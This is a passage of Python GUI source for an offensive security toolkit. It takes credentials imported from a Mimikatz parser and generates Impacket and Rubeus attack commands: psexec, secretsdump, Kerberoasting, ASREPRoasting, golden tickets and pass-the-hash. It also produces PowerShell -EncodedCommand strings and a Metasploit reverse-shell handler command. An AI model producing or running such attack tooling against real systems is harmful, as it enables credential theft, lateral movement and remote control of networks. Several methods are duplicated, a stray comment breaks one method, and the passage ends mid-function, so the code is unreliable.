                                            selectbackground="#333333",
                                            selectforeground="#ec1c3a")
        self.hash_creds_listbox.pack(fill=tb.BOTH, expand=True, pady=(2, 0))
        # Force colors after creation
        self.hash_creds_listbox.configure(background="#000000", foreground="#ec1c3a")
        self.hash_creds_listbox.bind('<<ListboxSelect>>', self.on_hash_select)
        
        # Command generation section
        command_frame = tb.Frame(main_frame, bootstyle="dark")
        command_frame.configure(style="TFrame")
        command_frame.pack(fill=tb.BOTH, expand=True, pady=(0, 10))
        
        command_label = tb.Label(command_frame, text="GENERATED COMMANDS:", 
                                style="SectionLabel.TLabel")
        command_label.pack(anchor="w", pady=(0, 10))
        
        # Generate button
        generate_button = tb.Button(command_frame, text="Generate Commands", 
                                   bootstyle="success", width=20,
                                   command=self.generate_impacket_commands)
        generate_button.pack(pady=(0, 10))
        
        # Command output area
        command_output_frame = tb.Frame(command_frame, bootstyle="dark")
        command_output_frame.configure(style="TFrame")
        command_output_frame.pack(fill=tb.BOTH, expand=True)
        
        command_scrollbar = tb.Scrollbar(command_output_frame, bootstyle="dark")
        command_scrollbar.pack(side=tb.RIGHT, fill=tb.Y)
        
        self.command_output = tb.Text(command_output_frame, height=8,
                                     background="#000000", foreground="#fefe00",
                                     font=("Consolas", 10, "bold"), wrap=tb.WORD,
                                     insertbackground="#fefe00",
                                     selectbackground="#333333",
                                     yscrollcommand=command_scrollbar.set)
        self.command_output.pack(side=tb.LEFT, fill=tb.BOTH, expand=True)
        self.command_output.configure(background="#000000", foreground="#fefe00")
        command_scrollbar.config(command=self.command_output.yview)
        
        # Initial text
        self.command_output.insert("1.0", "Generated Impacket/Rubeus commands will appear here...\n\n1. Import credentials from Mimikatz Parser\n2. Configure target IP/domain\n3. Select tool and technique\n4. Choose credentials\n5. Generate commands")
        
        # Copy button
        copy_commands_button = tb.Button(command_frame, text="Copy Commands", 
                                        bootstyle="info", width=15,
                                        command=self.copy_generated_commands)
        copy_commands_button.pack(pady=(10, 0))
        
        # Store references for credential import
        self.impacket_widgets = {
            'password_listbox': self.password_creds_listbox,
            'hash_listbox': self.hash_creds_listbox,
            'command_output': self.command_output,
            'import_status': self.import_status
        }

    def import_mimikatz_credentials(self):
        """Import credentials from the Mimikatz parser tab"""
        if not (hasattr(self, 'current_mimikatz_widgets') and self.current_mimikatz_widgets):
            self.import_status.config(text="Mimikatz parser not available", foreground="#ff5555")
            return
        
        # Get credentials from Mimikatz listboxes
        password_listbox = self.current_mimikatz_widgets['passwords_listbox']
        hash_listbox = self.current_mimikatz_widgets['hashes_listbox']
        
        # Clear current credential lists
        self.password_creds_listbox.delete(0, tk.END)
        self.hash_creds_listbox.delete(0, tk.END)
        
        password_count = 0
        hash_count = 0
        
        # Import password credentials
        for i in range(password_listbox.size()):
            cred = password_listbox.get(i)
            self.password_creds_listbox.insert(tk.END, cred)
            # Copy color from original
            original_color = password_listbox.itemcget(i, 'foreground')
            self.password_creds_listbox.itemconfig(i, foreground=original_color)
            password_count += 1
        
        # Import hash credentials
        for i in range(hash_listbox.size()):
            cred = hash_listbox.get(i)
            self.hash_creds_listbox.insert(tk.END, cred)
            # Copy color from original
            original_color = hash_listbox.itemcget(i, 'foreground')
            self.hash_creds_listbox.itemconfig(i, foreground=original_color)
            hash_count += 1
        
        # Update status
        self.import_status.config(
            text=f"Imported {password_count} passwords, {hash_count} hashes",
            foreground="#00ff00"
        )
        
        # Auto-populate domain if we can extract it from credentials
        if password_count > 0 or hash_count > 0:
            # Try to extract domain from first credential
            first_cred = None
            if password_count > 0:
                first_cred = self.password_creds_listbox.get(0)
            elif hash_count > 0:
                first_cred = self.hash_creds_listbox.get(0)
            
            if first_cred and ":" in first_cred:
                user_part = first_cred.split(":")[0]
                if "@" in user_part:
                    domain = user_part.split("@")[1] if "@" in user_part else user_part
                    self.domain_entry.delete(0, tk.END)
                    self.domain_entry.insert(0, domain.upper())

    def update_tool_selection(self, event=None):
        """Update tool selection and provide guidance"""
        tool = self.selected_tool.get()
        
        guidance = {
            "psexec.py - Remote command execution": "Requires admin credentials. Use with password or NTLM hash.",
            "wmiexec.py - WMI command execution": "Alternative to PsExec. Requires admin credentials.",
            "smbexec.py - SMB command execution": "Uses SMB for command execution. Requires admin credentials.", 
            "dcomexec.py - DCOM command execution": "Uses DCOM for execution. Requires admin credentials.",
            "secretsdump.py - Extract secrets": "Dump SAM/LSA secrets. Requires admin credentials.",
            "GetNPUsers.py - ASREPRoast attack": "Target users with 'Do not require Kerberos preauthentication'.",
            "GetUserSPNs.py - Kerberoast attack": "Request TGS for accounts with SPNs.",
            "goldenPac.py - Golden ticket attack": "Requires krbtgt hash for golden ticket creation.",
            "ticketer.py - Silver/Golden ticket creation": "Create Kerberos tickets with NTLM hashes.",
            "rubeus.exe - Kerberos attacks": "Comprehensive Kerberos attack toolkit."
        }
        
        # Update command output with guidance
        if tool in guidance:
            self.command_output.delete("1.0", tk.END)
            self.command_output.insert("1.0", f"Tool: {tool}\n\nGuidance: {guidance[tool]}\n\nSelect credentials and click 'Generate Commands' to create the command.")

    def on_password_select(self, event=None):
        """Handle password credential selection"""
        # Clear hash selection when password is selected
        self.hash_creds_listbox.selection_clear(0, tk.END)

    def on_hash_select(self, event=None):
        """Handle hash credential selection"""
        # Clear password selection when hash is selected
        self.password_creds_listbox.selection_clear(0, tk.END)

    def generate_impacket_commands(self):
        """Generate Impacket/Rubeus commands based on selections"""
        tool = self.selected_tool.get().split(" - ")[0]  # Extract tool name
        target_ip = self.target_ip_entry.get().strip()
        domain = self.domain_entry.get().strip()
        
        if not target_ip:
            self.command_output.delete("1.0", tk.END)
            self.command_output.insert("1.0", "Error: Please specify a target IP/hostname")
            return
        
        # Get selected credentials
        password_selection = self.password_creds_listbox.curselection()
        hash_selection = self.hash_creds_listbox.curselection()
        
        if not password_selection and not hash_selection:
            self.command_output.delete("1.0", tk.END)
            self.command_output.insert("1.0", "Error: Please select credentials (password or hash)")
            return
        
        commands = []
        
        # Generate commands based on selected credentials
        if password_selection:
            for idx in password_selection:
                cred = self.password_creds_listbox.get(idx)
                if ":" in cred:
                    user_info, password = cred.split(":", 1)
                    username = user_info.strip()
                    cmd = self.build_command(tool, username, password, None, target_ip, domain)
                    if cmd:
                        commands.append(cmd)
        
        if hash_selection:
            for idx in hash_selection:
                cred = self.hash_creds_listbox.get(idx)
                if ":" in cred:
                    user_info, hash_val = cred.split(":", 1)
                    username = user_info.strip()
                    cmd = self.build_command(tool, username, None, hash_val, target_ip, domain)
                    if cmd:
                        commands.append(cmd)
        
        # Display commands
        self.command_output.delete("1.0", tk.END)
        if commands:
            self.command_output.insert("1.0", f"Generated {len(commands)} command(s) for {tool}:\n\n")
            for i, cmd in enumerate(commands, 1):
                self.command_output.insert(tk.END, f"Command {i}:\n{cmd}\n\n")
            self.command_output.insert(tk.END, "Copy these commands and execute them on your attack machine.")
        else:
            self.command_output.insert("1.0", "Error: Unable to generate commands. Check your selections.")

    def build_command(self, tool, username, password, hash_val, target_ip, domain):
        """Build the appropriate command based on tool and credentials"""
        
        # Parse username to handle domain\user format
        if "\\" in username:
            domain_part, user_part = username.split("\\", 1)
            if not domain or domain == "DOMAIN.LOCAL":
                domain = domain_part
            username = user_part
        elif "@" in username:
            user_part, domain_part = username.split("@", 1)
            if not domain or domain == "DOMAIN.LOCAL":
                domain = domain_part
            username = user_part
        
        auth_part = ""
        if password:
            auth_part = f"{domain}/{username}:{password}"
        elif hash_val:
            auth_part = f"{domain}/{username} -hashes :{hash_val}"
        
        commands = {
            "psexec.py": f"python3 psexec.py {auth_part}@{target_ip}",
            "wmiexec.py": f"python3 wmiexec.py {auth_part}@{target_ip}",
            "smbexec.py": f"python3 smbexec.py {auth_part}@{target_ip}",
            "dcomexec.py": f"python3 dcomexec.py {auth_part}@{target_ip}",
            "secretsdump.py": f"python3 secretsdump.py {auth_part}@{target_ip}",
            "GetNPUsers.py": f"python3 GetNPUsers.py {domain}/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt",
            "GetUserSPNs.py": f"python3 GetUserSPNs.py {auth_part} -dc-ip {target_ip} -request",
            "goldenPac.py": f"python3 goldenPac.py {domain}/{username}@{target_ip}",
            "ticketer.py": f"python3 ticketer.py -nthash {hash_val} -domain-sid S-1-5-21-XXX-XXX-XXX -domain {domain} Administrator" if hash_val else None,
            "rubeus.exe": f"rubeus.exe kerberoast /domain:{domain} /dc:{target_ip}"
        }
        
        return commands.get(tool, f"# Unsupported tool: {tool}")

    def copy_generated_commands(self):
        """Copy generated commands to clipboard"""
        try:
            import pyperclip
            commands = self.command_output.get("1.0", tk.END).strip()
            if commands and "Generated" in commands:
                pyperclip.copy(commands)
                self.show_status_message("Commands copied to clipboard", "#00ff00")
            else:
                self.show_status_message("No commands to copy", "#ff5555")
        except ImportError:
            self.show_status_message("pyperclip not installed", "#ff5555")
        except Exception as e:
            self.show_status_message(f"Copy failed: {str(e)}", "#ff5555")

    def create_hash_tools_tab(self, parent_frame):
        """Hash generation tools tab"""
        main_frame = tb.Frame(parent_frame, bootstyle="dark")
        main_frame.configure(style="TFrame")
        main_frame.pack(fill=tb.BOTH, expand=True, padx=10, pady=10)
        
        # Title
        title_label = tb.Label(main_frame, text="HASH TOOLS", 
                              font=("Consolas", 16, "bold"),
                              style="StatusLabel.TLabel")
        title_label.pack(pady=(0, 20))
        
        # Create single column for hash generation only
        left_column = tb.Frame(main_frame, bootstyle="dark")
        left_column.configure(style="TFrame")
        left_column.pack(fill=tb.BOTH, expand=True, padx=20)
        
        # Hash Generator Section
        gen_label = tb.Label(left_column, text="HASH GENERATOR", 
                            font=("Consolas", 14, "bold"),
                            style="SectionLabel.TLabel")
        gen_label.pack(pady=(0, 10))
        
        # Input text
        input_label = tb.Label(left_column, text="Input Text:", 
                              foreground="#91ddd3", background="#000000",
                              font=("Consolas", 10, "bold"))
        input_label.pack(anchor="w")
        
        # Hash input entry with direct styling
        self.hash_input_entry = tk.Entry(left_column, font=("Consolas", 10),
                                         width=40, 
                                         background="#000000", foreground="#fefe00",
                                         insertbackground="#fefe00",
                                         selectbackground="#333333",
                                         selectforeground="#fefe00",
                                         highlightbackground="#333333",
                                         highlightcolor="#fefe00",
                                         borderwidth=1, relief="solid")
        self.hash_input_entry.pack(fill=tb.X, pady=(0, 10))
        self.hash_input_entry.insert(0, "password123")
        
        # Hash type selection
        hash_label = tb.Label(left_column, text="Hash Type:", 
                             foreground="#91ddd3", background="#000000",
                             font=("Consolas", 10, "bold"))
        hash_label.pack(anchor="w")
        
        self.hash_type_var = tb.StringVar(value="MD5")
        hash_types = ["MD5", "SHA1", "SHA256", "SHA512", "NTLM"]
        
        # Create custom style for the hash dropdown
        hash_dropdown_style = tb.Style()
        hash_dropdown_style.configure("HashCombo.TCombobox", 
                                      fieldbackground="#000000",
                                      foreground="#fefe00",
                                      bordercolor="#333333",
                                      lightcolor="#333333",
                                      darkcolor="#333333",
                                      selectbackground="#333333",
                                      selectforeground="#fefe00",
                                      arrowcolor="#fefe00",
                                      focuscolor="#fefe00")
        
        # Configure the dropdown list styling
        hash_dropdown_style.map("HashCombo.TCombobox",
                                fieldbackground=[('readonly', '#000000')],
                                foreground=[('readonly', '#fefe00')],
                                selectbackground=[('readonly', '#333333')],
                                selectforeground=[('readonly', '#fefe00')])
        
        hash_combo = tb.Combobox(left_column, textvariable=self.hash_type_var,
                                values=hash_types, state="readonly", width=38,
                                font=("Consolas", 10), style="HashCombo.TCombobox")
        hash_combo.pack(fill=tb.X, pady=(0, 10))
        
        # Generate button
        generate_button = tb.Button(left_column, text="Generate Hash", 
                                   bootstyle="success", width=20,
                                   command=self.generate_hash)
        generate_button.pack(pady=(0, 10))
        
        # Hash output
        hash_output_label = tb.Label(left_column, text="Generated Hash:", 
                                    foreground="#91ddd3", background="#000000",
                                    font=("Consolas", 10, "bold"))
        hash_output_label.pack(anchor="w")
        
        self.hash_output = tb.Text(left_column, height=6, 
                                  background="#000000", foreground="#fefe00",
                                  font=("Consolas", 10, "bold"), wrap=tb.WORD,
                                  insertbackground="#fefe00",
                                  selectbackground="#333333")
        self.hash_output.pack(fill=tb.BOTH, expand=True)
        self.hash_output.configure(background="#000000", foreground="#fefe00")
        self.hash_output.insert("1.0", "Generated hashes will appear here...")

    def generate_hash(self):
        """Generate hash from input text"""
        import hashlib
        
        text = self.hash_input_entry.get()
        hash_type = self.hash_type_var.get()
        
        if not text:
            self.hash_output.delete("1.0", tk.END)
            self.hash_output.insert("1.0", "Error: Please enter text to hash")
            return
        
        try:
            if hash_type == "MD5":
                hash_val = hashlib.md5(text.encode()).hexdigest()
            elif hash_type == "SHA1":
                hash_val = hashlib.sha1(text.encode()).hexdigest()
            elif hash_type == "SHA256":
                hash_val = hashlib.sha256(text.encode()).hexdigest()
            elif hash_type == "SHA512":
                hash_val = hashlib.sha512(text.encode()).hexdigest()
            elif hash_type == "NTLM":
                # Simple NTLM implementation
                import hashlib
                hash_val = hashlib.new('md4', text.encode('utf-16le')).hexdigest()
            else:
                hash_val = "Unsupported hash type"
            
            self.hash_output.delete("1.0", tk.END)
            self.hash_output.insert("1.0", f"Input: {text}\n")
            self.hash_output.insert(tk.END, f"Hash Type: {hash_type}\n")
            self.hash_output.insert(tk.END, f"Hash: {hash_val}")
            
            self.show_status_message(f"{hash_type} hash generated", "#00ff00")
            
        except Exception as e:
            self.hash_output.delete("1.0", tk.END)
            self.hash_output.insert("1.0", f"Error generating hash: {str(e)}")

    def create_encoder_tab(self, parent_frame):
        """Encoding/Decoding tools tab"""
        main_frame = tb.Frame(parent_frame, bootstyle="dark")
        main_frame.configure(style="TFrame")
        main_frame.pack(fill=tb.BOTH, expand=True, padx=10, pady=10)
        
        # Title
        title_label = tb.Label(main_frame, text="ENCODER / DECODER", 
                              font=("Consolas", 16, "bold"),
                              style="StatusLabel.TLabel")
        title_label.pack(pady=(0, 20))
        
        # Controls frame
        controls_frame = tb.Frame(main_frame, bootstyle="dark")
        controls_frame.configure(style="TFrame")
        controls_frame.pack(fill=tb.X, pady=(0, 10))
        
        # Encoding type selection
        encoding_label = tb.Label(controls_frame, text="ENCODING TYPE:", 
                                 font=("Consolas", 12, "bold"),
                                 foreground="#91ddd3", background="#000000")
        encoding_label.pack(side=tb.LEFT, padx=(0, 10))
        
        self.encoding_var = tb.StringVar(value="Windows Base64")
        encodings = ["Windows Base64", "Base64", "URL", "HTML", "Hex", "ROT13", "Binary"]
        
        # Create custom style for the encoding dropdown
        encoding_dropdown_style = tb.Style()
        encoding_dropdown_style.configure("EncodingCombo.TCombobox", 
                                          fieldbackground="#000000",
                                          foreground="#fefe00",
                                          bordercolor="#333333",
                                          lightcolor="#333333",
                                          darkcolor="#333333",
                                          selectbackground="#333333",
                                          selectforeground="#fefe00",
                                          arrowcolor="#fefe00",
                                          focuscolor="#fefe00")
        
        # Configure the dropdown list styling
        encoding_dropdown_style.map("EncodingCombo.TCombobox",
                                    fieldbackground=[('readonly', '#000000')],
                                    foreground=[('readonly', '#fefe00')],
                                    selectbackground=[('readonly', '#333333')],
                                    selectforeground=[('readonly', '#fefe00')])
        
        encoding_combo = tb.Combobox(controls_frame, textvariable=self.encoding_var,
                                    values=encodings, state="readonly", width=15,
                                    font=("Consolas", 10), style="EncodingCombo.TCombobox")
        encoding_combo.pack(side=tb.LEFT, padx=(0, 20))
        
        # Buttons
        encode_button = tb.Button(controls_frame, text="Encode", 
                                 bootstyle="success", width=10,
                                 command=self.encode_text)
        encode_button.pack(side=tb.LEFT, padx=(0, 5))
        
        decode_button = tb.Button(controls_frame, text="Decode", 
                                 bootstyle="info", width=10,
                                 command=self.decode_text)
        decode_button.pack(side=tb.LEFT, padx=(0, 5))
        
        clear_button = tb.Button(controls_frame, text="Clear", 
                                bootstyle="secondary", width=10,
                                command=self.clear_encoder)
        clear_button.pack(side=tb.LEFT)
        
        # Input/Output area
        io_frame = tb.Frame(main_frame, bootstyle="dark")
        io_frame.configure(style="TFrame")
        io_frame.pack(fill=tb.BOTH, expand=True)
        
        # Input section
        input_label = tb.Label(io_frame, text="INPUT:", 
                              font=("Consolas", 12, "bold"),
                              foreground="#91ddd3", background="#000000")
        input_label.pack(anchor="w", pady=(0, 5))
        
        self.encoder_input = tb.Text(io_frame, height=8, 
                                    background="#000000", foreground="#fefe00",
                                    font=("Consolas", 10, "bold"), wrap=tb.WORD,
                                    insertbackground="#fefe00",
                                    selectbackground="#333333")
        self.encoder_input.pack(fill=tb.BOTH, expand=True, pady=(0, 10))
        # Force colors after creation
        self.encoder_input.configure(background="#000000", foreground="#fefe00")
        
        # Set up placeholder text management
        self.encoder_placeholder = "Enter text to encode/decode here..."
        self.encoder_input.insert("1.0", self.encoder_placeholder)
        self.encoder_has_placeholder = True
        
        # Bind events for placeholder management
        self.encoder_input.bind("<FocusIn>", self.on_encoder_focus_in)
        self.encoder_input.bind("<FocusOut>", self.on_encoder_focus_out)
        self.encoder_input.bind("<Key>", self.on_encoder_key_press)
        
        # Output section
        output_label = tb.Label(io_frame, text="OUTPUT:", 
                               font=("Consolas", 12, "bold"),
                               foreground="#91ddd3", background="#000000")
        output_label.pack(anchor="w", pady=(0, 5))
        
        self.encoder_output = tb.Text(io_frame, height=8, 
                                     background="#000000", foreground="#00ff00",
                                     font=("Consolas", 10, "bold"), wrap=tb.WORD,
                                     insertbackground="#00ff00",
                                     selectbackground="#333333")
        self.encoder_output.pack(fill=tb.BOTH, expand=True)
        self.encoder_output.configure(background="#000000", foreground="#00ff00")
        self.encoder_output.insert("1.0", "Encoded/decoded output will appear here...")

    def encode_text(self):
        """Encode text based on selected encoding type"""
        import base64
        import urllib.parse
        import html
        import binascii
        
        text = self.encoder_input.get("1.0", tk.END).strip()
        encoding_type = self.encoding_var.get()
        
        # Check if text is empty or still contains placeholder
        if not text or text == self.encoder_placeholder.strip() or self.encoder_has_placeholder:
            self.encoder_output.delete("1.0", tk.END)
            self.encoder_output.insert("1.0", "Error: Please enter text to encode")
            return
        
        try:
            if encoding_type == "Windows Base64":
                # Convert to UTF-16LE (Windows Unicode) then Base64 - for powershell -EncodedCommand
                utf16le_bytes = text.encode('utf-16le')
                result = base64.b64encode(utf16le_bytes).decode()
                result = f"UTF-16LE Base64 (for powershell -EncodedCommand):\n{result}\n\nUsage: powershell -EncodedCommand {result}"
            elif encoding_type == "Base64":
                result = base64.b64encode(text.encode()).decode()
            elif encoding_type == "URL":
                result = urllib.parse.quote(text)
            elif encoding_type == "HTML":
                result = html.escape(text)
            elif encoding_type == "Hex":
                result = text.encode().hex()
            elif encoding_type == "ROT13":
                result = text.encode().decode('rot13')
            elif encoding_type == "Binary":
                result = ' '.join(format(ord(c), '08b') for c in text)
            else:
                result = "Unsupported encoding type"
            
            self.encoder_output.delete("1.0", tk.END)
            self.encoder_output.insert("1.0", f"Encoding: {encoding_type}\n\nResult:\n{result}")
            
        except Exception as e:
            self.encoder_output.delete("1.0", tk.END)
            self.encoder_output.insert("1.0", f"Error encoding: {str(e)}")

    def decode_text(self):
        """Decode text based on selected encoding type"""
        import base64
        import urllib.parse
        import html
        import binascii
        
        text = self.encoder_input.get("1.0", tk.END).strip()
        encoding_type = self.encoding_var.get()
        
        # Check if text is empty or still contains placeholder
        if not text or text == self.encoder_placeholder.strip() or self.encoder_has_placeholder:
            self.encoder_output.delete("1.0", tk.END)
            self.encoder_output.insert("1.0", "Error: Please enter text to decode")
            return
        
        try:
            if encoding_type == "Windows Base64":
                # Decode Base64 then convert from UTF-16LE (Windows Unicode)
                # Handle both raw base64 and our formatted output
                base64_text = text
                if "UTF-16LE Base64" in text:
                    # Extract just the base64 part from our formatted output
                    lines = text.split('\n')
                    for line in lines:
                        if line and not line.startswith(('UTF-16LE', 'Usage:')):
                            base64_text = line.strip()
                            break
                
                decoded_bytes = base64.b64decode(base64_text)
                result = decoded_bytes.decode('utf-16le')
            elif encoding_type == "Base64":
                result = base64.b64decode(text).decode()
            elif encoding_type == "URL":
                result = urllib.parse.unquote(text)
            elif encoding_type == "HTML":
                result = html.unescape(text)
            elif encoding_type == "Hex":
                result = bytes.fromhex(text).decode()
            elif encoding_type == "ROT13":
                result = text.encode().decode('rot13')
            elif encoding_type == "Binary":
                # Remove spaces and decode binary
                binary_text = text.replace(' ', '')
                result = ''.join(chr(int(binary_text[i:i+8], 2)) for i in range(0, len(binary_text), 8))
            else:
                result = "Unsupported encoding type"
            
            self.encoder_output.delete("1.0", tk.END)
            self.encoder_output.insert("1.0", f"Decoding: {encoding_type}\n\nResult:\n{result}")
            
        except Exception as e:
            self.encoder_output.delete("1.0", tk.END)
            self.encoder_output.insert("1.0", f"Error decoding: {str(e)}")

    def clear_encoder(self):
        """Clear encoder input and output"""
        self.encoder_input.delete("1.0", tk.END)
        self.encoder_input.insert("1.0", self.encoder_placeholder)
        self.encoder_has_placeholder = True
        self.encoder_output.delete("1.0", tk.END)
        self.encoder_output.insert("1.0", "Encoded/decoded output will appear here...")

    def on_encoder_focus_in(self, event):
        """Clear placeholder text when user focuses on input"""
        if self.encoder_has_placeholder:
            self.encoder_input.delete("1.0", tk.END)
            self.encoder_has_placeholder = False

    def on_encoder_focus_out(self, event):
        """Restore placeholder if field is empty when user leaves"""
        content = self.encoder_input.get("1.0", tk.END).strip()
        if not content:
            self.encoder_input.delete("1.0", tk.END)
            self.encoder_input.insert("1.0", self.encoder_placeholder)
            self.encoder_has_placeholder = True

    def on_encoder_key_press(self, event):
        """Clear placeholder on any key press"""
        if self.encoder_has_placeholder:
            # Clear placeholder on next update cycle to allow the keystroke to be processed
            self.encoder_input.after(1, self._clear_placeholder_after_key)

    def _clear_placeholder_after_key(self):
        """Helper method to clear placeholder after key processing"""
        if self.encoder_has_placeholder:
            current_content = self.encoder_input.get("1.0", tk.END).strip()
            if current_content != self.encoder_placeholder.strip():
                # User actually typed something, clear the placeholder
                self.encoder_input.delete("1.0", tk.END)
                self.encoder_has_placeholder = False
                # Let the user continue typing normally

    # Render the generated script or error message in the output text widget
    def render_script(self, script):
        self.output_text.configure(state="normal")
        self.output_text.delete("1.0", tb.END)

        if script and script.strip():
            self.output_text.insert(tb.END, script.strip(), "bold")
        else:
            self.output_text.insert(tb.END, "Error: No shellcode generated or encountered an error.")

        self.output_text.configure(state="disabled")

    # Add a method to retrieve the correct JSON template based on selected technique
    def get_selected_template(self):
        """Retrieve the correct JSON template based on selected technique."""
        technique_key = self.selected_technique.get()
        logger.debug(f"Selected template: {technique_key}")
        
        selected_template = self.template_data.get(technique_key, {})
        return selected_template

    # Glitch animation methods
    def start_glitch_animation(self, img_path=None, interval=240):
        if hasattr(self, "glitch_job"):
            self.stop_glitch_animation()

        png_files = glob.glob("media/*.png")
        if not png_files:
            return

        base_image = Image.open(img_path) if img_path else Image.open(random.choice(png_files))
        base_image = base_image.resize((160, 160))

        # Create a label to hold the loading image
        def glitch_loop():
            if not getattr(self, "glitch_running", False):
                return

            glitched = self.apply_glitch_effect(base_image.copy())
            tk_img = ImageTk.PhotoImage(glitched)
            self.loading_image_label.configure(image=tk_img)
            self.loading_image_label.image = tk_img
            self.loading_image_label.place(relx=0.5, rely=0.90, anchor="s")

            self.glitch_job = self.root.after(interval, glitch_loop)

        self.glitch_running = True
        glitch_loop()

    # Stop the glitch animation
    def stop_glitch_animation(self):
        self.glitch_running = False
        if hasattr(self, "glitch_job") and self.glitch_job:
            self.root.after_cancel(self.glitch_job)
            self.glitch_job = None
        self.loading_image_label.place_forget()

    # Apply a glitch effect to an image
    def apply_glitch_effect(self, img):
        img = img.convert("RGB")
        glitch_type = random.choice(["flip", "shift", "tint", "slice", "zoom"])
        if glitch_type == "flip":
            img = img.transpose(Image.FLIP_LEFT_RIGHT if random.random() > 0.5 else Image.FLIP_TOP_BOTTOM)
        elif glitch_type == "shift":
            dx, dy = random.randint(-10, 10), random.randint(-10, 10)
            img = img.transform(img.size, Image.AFFINE, (1, 0, dx, 0, 1, dy))
        elif glitch_type == "tint":
            r, g, b = img.split()
            tint_channel = random.choice([r, g, b]).point(lambda p: p * random.uniform(0.5, 1.5))
            img = Image.merge("RGB", (r, g, tint_channel))
        elif glitch_type == "slice":
            pixels = img.load()
            width, height = img.size
            for y in range(0, height, 4):
                offset = random.randint(-5, 5)
                for x in range(width):
                    if 0 <= x + offset < width:
                        pixels[x, y] = pixels[(x + offset) % width, y]
        elif glitch_type == "zoom":
            w, h = img.size
            left = random.randint(0, w // 4)
            top = random.randint(0, h // 4)
            right = random.randint(3 * w // 4, w)
            bottom = random.randint(3 * h // 4, h)
            zoom_area = img.crop((left, top, right, bottom))
            img = zoom_area.resize((w, h))
        return img

    # Render the generated script or error message in the output text widget
    def render_script(self, script):
        self.output_text.configure(state="normal")
        self.output_text.delete("1.0", tb.END)

        if script and script.strip():
            self.output_text.insert(tb.END, script.strip(), "bold")
        else:
            self.output_text.insert(tb.END, "[!] Error: No script generated.\n")
            self.output_text.image_create("1.0", image=self.output_bg_image)
            self.output_text.tag_lower("sel")

        self.output_text.configure(state="disabled")

    # Build the msfconsole command based on user selections
    def build_msfconsole_cmd(self):
        return f"msfconsole -q -x 'use exploit/multi/handler;set payload windows/{'x64/' if self.architecture.get() == 'x64' else ''}{self.payload_type.get()}/reverse_{self.selected_connection.get()};set LHOST {self.selected_interface.get()};set LPORT {self.port.get()};set ExitonSession false;run -j'"



    # Start the marquee effect for long msfconsole commands
    def start_marquee(self):
        text = self.full_msf_cmd
        if len(text) <= 15:
            return

        # Cancel previous marquee if it exists
        if self.marquee_job:
            self.root.after_cancel(self.marquee_job)
            self.marquee_job = None 

        # Marquee scrolling function
        def scroll(index=0):
            display_text = text[index:] + "   " + text[:index]
            self.msf_entry.configure(state="normal")
            self.msf_entry.delete("1.0", tb.END)
            visible_text = display_text[:35]
            if " " in visible_text:
                visible_text = visible_text.rsplit(" ", 1)[0]
            update_msf_entry(self, visible_text)
            next_index = (index + 1) % len(text)
            self.marquee_job = self.root.after(150, lambda: scroll(next_index))

        scroll()

    # Add a method to retrieve the correct JSON template based on selected technique
    def get_selected_template(self):
        """Retrieve the correct JSON template based on selected technique."""
        technique_key = self.selected_technique.get()
        logger.debug(f"Selected template: {technique_key}")
        
        selected_template = self.template_data.get(technique_key, {})
        return selected_template

    # Glitch animation methods
    def start_glitch_animation(self, img_path=None, interval=240):
        if hasattr(self, "glitch_job"):
            self.stop_glitch_animation()

        png_files = glob.glob("media/*.png")
        if not png_files:
            return

        base_image = Image.open(img_path) if img_path else Image.open(random.choice(png_files))
        base_image = base_image.resize((160, 160))

#step=0  #### safe to remove

        # Create a label to hold the loading image
        def glitch_loop():
            if not getattr(self, "glitch_running", False):
                return

            glitched = self.apply_glitch_effect(base_image.copy())
            tk_img = ImageTk.PhotoImage(glitched)
            self.loading_image_label.configure(image=tk_img)
            self.loading_image_label.image = tk_img
            self.loading_image_label.place(relx=0.5, rely=0.90, anchor="s")

            self.glitch_job = self.root.after(interval, glitch_loop)

        self.glitch_running = True
        glitch_loop()

    # Stop the glitch animation
    def stop_glitch_animation(self):
        self.glitch_running = False
        if hasattr(self, "glitch_job") and self.glitch_job:
            self.root.after_cancel(self.glitch_job)
            self.glitch_job = None
        self.loading_image_label.place_forget()

    # Apply a glitch effect to an image
    def apply_glitch_effect(self, img):
        img = img.convert("RGB")
        glitch_type = random.choice(["flip", "shift", "tint", "slice", "zoom"])
        if glitch_type == "flip":
            img = img.transpose(Image.FLIP_LEFT_RIGHT if random.random() > 0.5 else Image.FLIP_TOP_BOTTOM)
        elif glitch_type == "shift":
            dx, dy = random.randint(-10, 10), random.randint(-10, 10)
            img = img.transform(img.size, Image.AFFINE, (1, 0, dx, 0, 1, dy))
        elif glitch_type == "tint":
            r, g, b = img.split()
            tint_channel = random.choice([r, g, b]).point(lambda p: p * random.uniform(0.5, 1.5))
            img = Image.merge("RGB", (r, g, tint_channel))
        elif glitch_type == "slice":
            pixels = img.load()
            width, height = img.size
            for y in range(0, height, 4):
                offset = random.randint(-5, 5)
                for x in range(width):
                    if 0 <= x + offset < width:
                        pixels[x, y] = pixels[(x + offset) % width, y]
        elif glitch_type == "zoom":
            w, h = img.size
            left = random.randint(0, w // 4)
            top = random.randint(0, h // 4)
            right = random.randint(3 * w // 4, w)
            bottom = random.randint(3 * h // 4, h)
            zoom_area = img.crop((left, top, right, bottom))
            img = zoom_area.resize((w, h))
        return img

    # Flicker effect for widgets and styles
    def flicker_widget(self, widget, color1, color2, steps=6, interval=100, final_color=None):
        style_name = widget.cget("style") or "TButton"
        style = tb.Style()

        def flicker(step=0):
            if step < steps:
                color = color1 if step % 2 == 0 else color2
                style.map(style_name, foreground=[('', color)])
                self.root.after(interval, lambda: flicker(step + 1))
            else:
                style.map(style_name, foreground=[('', final_color or "#91ddd3")])

        flicker()

    # Flicker effect for styles
    def flicker_style(self, style_name, color1, color2, steps=6, interval=80, final_color=None):
        style = tb.Style()
        def flicker(step=0):
            if step < steps:
                color = color1 if step % 2 == 0 else color2
                style.configure(style_name, foreground=color)
                self.root.after(interval, lambda: flicker(step + 1))
            elif final_color:
                style.configure(style_name, foreground=final_color)
        flicker()

    def debug_current_command(self):
        """Debug method to print current PowerShell command"""
        try:
            if hasattr(self, 'current_mimikatz_widgets') and self.current_mimikatz_widgets:
                ps_widget = self.current_mimikatz_widgets.get('powershell_cmd')
                if ps_widget:
                    current_text = ps_widget.get("1.0", tk.END).strip()
                    logger.debug("CURRENT POWERSHELL COMMAND:")
                    logger.debug(f"'{current_text}'")
                    logger.debug(f"Command length: {len(current_text)}")
                    
                    # Also show interface info
                    interface = self.selected_listener_interface.get()
                    port = self.listener_port.get()
                    ip = self.get_interface_ip(interface)
                    logger.debug(f"Interface: {interface} → IP: {ip}, Port: {port}")
                else:
